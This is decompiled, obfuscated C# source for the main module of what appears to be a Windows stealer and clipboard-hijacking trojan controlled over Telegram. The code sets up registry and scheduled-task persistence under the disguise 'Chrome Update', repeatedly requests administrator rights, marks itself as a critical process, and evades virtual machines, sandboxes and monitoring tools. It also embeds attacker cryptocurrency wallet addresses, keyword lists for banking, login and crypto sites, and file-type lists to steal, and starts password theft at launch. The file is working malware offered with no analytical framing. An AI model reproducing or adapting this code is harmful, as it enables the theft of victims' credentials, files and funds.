using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using ns13;
using ns14;
using ns18;
using ns19;
using ns21;

namespace ns1;

public static class GClass9
{
	public enum GEnum2 : uint
	{
		const_0 = 2147483648u,
		const_1 = 2u,
		const_2 = 1u
	}

	public class GForm0 : Form
	{
		public const int int_0 = 17;

		public const int int_1 = 22;

		public const uint uint_0 = 1u;

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool ShutdownBlockReasonCreate(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string reason);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool ShutdownBlockReasonDestroy(IntPtr hWnd);

		[DllImport("kernel32.dll")]
		private static extern bool SetProcessShutdownParameters(uint dwLevel, uint dwFlags);

		public static void smethod_0()
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("臼曰靑入工氏長弓黹幺片厶辛无匚月歹缶夂血几乙見麻龠谷刀血至辵支夂卩欠魚斤小雨鼠黽十手鼓矛臣見弋匚艮匕辵干弓子几", Application.get_ExecutablePath());
		}

		public GForm0()
		{
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
			((Form)this).set_ShowInTaskbar(false);
			((Control)this).set_Visible(false);
			((Form)this).set_Opacity(0.0);
			((Form)this).add_Load((EventHandler)MainForm_Load);
			SetProcessShutdownParameters(1023u, 1u);
		}

		private void MainForm_Load(object sender, EventArgs e)
		{
			((Form)this).set_Size(new Size(0, 0));
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() != 17 && ((Message)(ref m)).get_Msg() != 22)
			{
				((Form)this).WndProc(ref m);
				return;
			}
			Console.WriteLine("[!] Shutdown signal received..");
			ShutdownBlockReasonCreate(((Control)this).get_Handle(), "Please wait...");
			smethod_1();
			ShutdownBlockReasonDestroy(((Control)this).get_Handle());
			Environment.Exit(0);
		}
	}

	private class Class6
	{
		public static bool bool_0 = true;

		public static bool bool_1 = true;

		public static bool bool_2 = true;

		public static bool bool_3 = true;

		public static string string_0 = Application.get_ExecutablePath();

		public static bool bool_4 = true;

		public static string string_1 = "Chrome Update";

		public static bool bool_5 = true;

		public static bool bool_6 = true;

		public static bool bool_7 = true;

		public static int int_0 = 0;

		public static bool bool_8 = true;

		public static string[] string_2 = new string[9] { "taskmgr", "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };

		public static Dictionary<string, string> dictionary_0 = new Dictionary<string, string>
		{
			{ "btc", "bc1q0n04q0t5c6hds9yxyhw8tqdy2kr6ny74yaa0v7" },
			{ "eth", "0x2c64346C5AE33F68Ef4c0fCAb8bbDC8e214F6A0E" },
			{ "xmr", "--- ClipperXMR ---" },
			{ "xlm", "GAGVJLJTJ3FN4HSMUBZ26SEKUJKFQZTRZGCOJKZPKCGSQYI2Y37EUI3K" },
			{ "xrp", "--- ClipperXRP ---" },
			{ "ltc", "--- ClipperLTC ---" },
			{ "bch", "qzdnr0c9ulrf34lgy8l5tjqjyjpypkxllc44gsur62" }
		};

		public static string[] string_3 = new string[27]
		{
			"facebook", "twitter", "chat", "telegram", "skype", "discord", "viber", "message", "gmail", "protonmail",
			"outlook", "password", "encryption", "account", "login", "key", "sign in", "пароль", "bank", "банк",
			"credit", "card", "кредит", "shop", "buy", "sell", "купить"
		};

		public static string[] string_4 = new string[17]
		{
			"qiwi", "money", "exchange", "bank", "credit", "card", "банк", "кредит", "bankofameria", "wellsfargo",
			"chase", "53.com", "navy", "citi", "citizens", "usaa", "regions"
		};

		public static string[] string_5 = new string[25]
		{
			"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "btc", "eth", "xmr", "xlm",
			"xrp", "ltc", "bch", "coinbase", "bitpay", "blockchain", "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency",
			"crypto", "trade", "trading", "биткоин", "wallet"
		};

		public static string[] string_6 = new string[8] { "porn", "sex", "hentai", "порно", "sex", "google", "mail", "bitcoin" };

		public static int int_1 = 1000000;

		public static Dictionary<string, string[]> dictionary_1 = new Dictionary<string, string[]>
		{
			["Document"] = new string[12]
			{
				"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
				"json", "txt"
			},
			["DataBase"] = new string[14]
			{
				"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
				"dbf", "wallet", "ini", "dat"
			},
			["SourceCode"] = new string[21]
			{
				"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
				"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino", "zip",
				"rar"
			},
			["Image"] = new string[8] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai", "mp4" }
		};
	}

	public static Thread thread_0 = new Thread(smethod_21);

	private static string string_0 = Path.Combine(Class56.smethod_0(), Class7.string_0 + "@" + Class7.string_1 + "_" + Class7.string_2);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_0);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string string_1);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint uint_0, uint uint_1, uint uint_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern GEnum2 SetThreadExecutionState(GEnum2 genum2_0);

	public static void smethod_0()
	{
		if (Class6.bool_5)
		{
			Console.WriteLine("[+] Set process critical");
			try
			{
				Process.EnterDebugMode();
				RtlSetProcessIsCritical(1u, 0u, 0u);
			}
			catch
			{
			}
		}
	}

	public static void smethod_1()
	{
		if (Class6.bool_5)
		{
			try
			{
				Console.WriteLine("[+] Set process not critical");
				RtlSetProcessIsCritical(0u, 0u, 0u);
			}
			catch
			{
			}
		}
	}

	public static void smethod_2()
	{
		if (Class6.bool_6)
		{
			Console.WriteLine("[+] Hiding console window");
			ShowWindow(GetConsoleWindow(), 0);
		}
	}

	public static bool smethod_3()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		ManagementObjectEnumerator enumerator;
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if ((current.get_Item("Manufacturer").ToString()!.ToLower() == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || current.get_Item("Manufacturer").ToString()!.ToLower().Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
			return true;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current2 = enumerator.get_Current();
				if (current2.GetPropertyValue("Name").ToString()!.Contains("VMware") && current2.GetPropertyValue("Name").ToString()!.Contains("VBox"))
				{
					return true;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return false;
	}

	public static bool smethod_4()
	{
		string[] array = new string[5] { "SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll", "cmdvrt32.dll" };
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (GetModuleHandle(array[num]).ToInt32() != 0)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public static bool smethod_5()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	public static string smethod_6()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						list.Add(current.get_Item("displayName").ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "N/A";
				}
				return string.Join(", ", list.ToArray()) + ".";
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return "N/A";
		}
	}

	private static void smethod_7(string string_1)
	{
		if (Class6.bool_4)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = "schtasks.exe",
				Arguments = string_1
			};
			process.Start();
			process.WaitForExit();
		}
	}

	public static void smethod_8()
	{
		while (!smethod_19())
		{
			Console.WriteLine("[~] Trying elevate previleges to administrator...");
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = Application.get_ExecutablePath();
			process.StartInfo.Arguments = "";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.Verb = "runas";
			process.StartInfo.CreateNoWindow = true;
			try
			{
				process.Start();
				process.WaitForExit();
				smethod_1();
				Environment.Exit(1);
			}
			catch (Win32Exception)
			{
				if (Class6.bool_0)
				{
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_9()
	{
		Console.WriteLine("[+] Copying to system...");
		if (!Directory.Exists(Path.GetDirectoryName(Class6.string_0)))
		{
			Directory.CreateDirectory(Path.GetDirectoryName(Class6.string_0));
		}
		if (!File.Exists(Class6.string_0))
		{
			File.Copy(Application.get_ExecutablePath(), Class6.string_0);
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetDirectoryName(Class6.string_0));
			if (Class6.bool_1)
			{
				directoryInfo.Attributes |= FileAttributes.Hidden;
			}
			if (Class6.bool_2)
			{
				directoryInfo.Attributes |= FileAttributes.System;
			}
		}
	}

	public static void smethod_10()
	{
		Console.WriteLine("[+] Uninstalling from system...");
		smethod_1();
		smethod_13();
		string text = Path.GetTempFileName() + ".bat";
		string text2 = Process.GetCurrentProcess().Id.ToString();
		smethod_1();
		using (StreamWriter streamWriter = File.AppendText(text))
		{
			streamWriter.WriteLine(":l");
			streamWriter.WriteLine("Tasklist /fi \"PID eq " + text2 + "\" | find \":\"");
			streamWriter.WriteLine("if Errorlevel 1 (");
			streamWriter.WriteLine(" Timeout /T 1 /Nobreak");
			streamWriter.WriteLine(" Goto l");
			streamWriter.WriteLine(")");
			streamWriter.WriteLine("Rmdir /S /Q \"" + Path.GetDirectoryName(Class6.string_0) + "\"");
		}
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C " + text + " & Del " + text,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Environment.Exit(1);
	}

	public static void smethod_11()
	{
		if (Class6.bool_7 && (smethod_4() || smethod_3() || smethod_5()))
		{
			Environment.Exit(2);
		}
	}

	public static void smethod_12()
	{
		Console.WriteLine("[+] Installing to autorun...");
		smethod_7("/create /f /sc ONLOGON /RL HIGHEST /tn \"" + Class6.string_1 + "\" /tr \"" + Class6.string_0 + "\"");
	}

	public static void smethod_13()
	{
		Console.WriteLine("[+] Uninstalling from autorun...");
		smethod_7("/delete /f /tn \"" + Class6.string_1 + "\"");
	}

	public static void smethod_14()
	{
		int num = Class6.int_0 * 1000;
		num = new Random().Next(num, num + 3000);
		Thread.Sleep(num);
	}

	public static void smethod_15()
	{
		if (Class6.bool_3 && !(Application.get_ExecutablePath() == Class6.string_0))
		{
			string text = Path.GetTempFileName() + ".bat";
			string text2 = Process.GetCurrentProcess().Id.ToString();
			smethod_1();
			using (StreamWriter streamWriter = File.AppendText(text))
			{
				streamWriter.WriteLine(":l");
				streamWriter.WriteLine("Tasklist /fi \"PID eq " + text2 + "\" | find \":\"");
				streamWriter.WriteLine("if Errorlevel 1 (");
				streamWriter.WriteLine(" Timeout /T 1 /Nobreak");
				streamWriter.WriteLine(" Goto l");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"");
				streamWriter.WriteLine("Cd \"" + Path.GetDirectoryName(Class6.string_0) + "\"");
				streamWriter.WriteLine("Timeout /T 1 /Nobreak");
				streamWriter.WriteLine("Start \"\" \"" + Path.GetFileName(Class6.string_0) + "\"");
			}
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C " + text + " & Del " + text,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(1);
		}
	}

	public static void smethod_16()
	{
		try
		{
			SetThreadExecutionState((GEnum2)2147483651u);
		}
		catch
		{
		}
	}

	public static void smethod_17()
	{
		Ping ping;
		while (true)
		{
			ping = new Ping();
			PingReply pingReply;
			try
			{
				pingReply = ping.Send("google.com", 600);
			}
			catch
			{
				continue;
			}
			if (pingReply.Status == IPStatus.Success)
			{
				break;
			}
			Console.WriteLine("[!] Retrying connect to internet...");
		}
		Console.WriteLine("[+] Connected to internet");
		while (true)
		{
			PingReply pingReply;
			try
			{
				pingReply = ping.Send("api.telegram.org", 600);
			}
			catch
			{
				continue;
			}
			if (pingReply.Status == IPStatus.Success)
			{
				break;
			}
			Console.WriteLine("[!] Retrying connect to api.telegram.org");
		}
		Console.WriteLine("[+] Connected to api.telegram.org");
	}

	public static void smethod_18()
	{
		bool createdNew = false;
		string text = "1937717367".MD5();
		if (smethod_19())
		{
			text = "ADMIN:" + text;
		}
		new Mutex(initiallyOwned: false, text, out createdNew);
		if (!createdNew)
		{
			Console.WriteLine("[?] Already running 1 copy of the program");
			Environment.Exit(1);
		}
	}

	public static string MD5(this string string_1)
	{
		using MD5 mD = System.Security.Cryptography.MD5.Create();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(string_1));
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2").ToLower());
		}
		return stringBuilder.ToString();
	}

	public static bool smethod_19()
	{
		using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
		return new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static List<string> smethod_20()
	{
		List<string> list = new List<string>();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			list.Add(process.ProcessName.ToUpper());
		}
		return list;
	}

	public static void smethod_21()
	{
		if (!Class6.bool_8)
		{
			return;
		}
		Console.WriteLine("[+] Process checker started");
		while (true)
		{
			List<string> list = smethod_20();
			string[] string_ = Class6.string_2;
			foreach (string text in string_)
			{
				string item = text.ToUpper();
				if (!list.Contains(item) || GClass11.bool_0)
				{
					continue;
				}
				Console.WriteLine("[!] Stopping command listener thread");
				GClass11.bool_0 = true;
				while (true)
				{
					list = smethod_20();
					if (!list.Contains(item))
					{
						break;
					}
					Thread.Sleep(1000);
				}
				Console.WriteLine("[+] Restarting command listener thread");
				GClass11.bool_0 = false;
				GClass11.smethod_3("\ud83d\ude4a Found blocked process " + text + ".exe");
				break;
			}
			Thread.Sleep(1500);
		}
	}

	[STAThread]
	public static void Main()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		if (!GClass10.smethod_0())
		{
			Environment.Exit(0);
		}
		try
		{
			GClass11.smethod_11(smethod_22());
			if (!GClass23.smethod_0())
			{
				Environment.Exit(0);
			}
			if (Convert.ToBoolean(GClass10.string_12))
			{
				Class83.smethod_0();
			}
			if (Convert.ToBoolean(GClass10.string_5))
			{
				Class82.smethod_0();
			}
			if (Convert.ToBoolean(GClass10.string_14) && GClass22.smethod_0())
			{
				GClass25.smethod_1();
			}
			GClass22.smethod_4();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				if (!GClass28.Boolean_0)
				{
					GClass28.smethod_3();
					GClass28.smethod_0();
					smethod_2();
					smethod_8();
					smethod_9();
					smethod_12();
					smethod_15();
					smethod_17();
					thread_0.Start();
					smethod_0();
					smethod_16();
					Application.Run((Form)(object)new GForm0());
				}
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	public static string smethod_22()
	{
		Console.WriteLine("Running passwords recovery...");
		if (!Directory.Exists(string_0))
		{
			Directory.CreateDirectory(string_0);
		}
		else
		{
			try
			{
				Class62.smethod_0(string_0);
			}
			catch
			{
				Console.WriteLine("Failed recursive remove directory");
			}
		}
		if (Class57.smethod_0(string_0))
		{
			return string_0;
		}
		return "";
	}
}
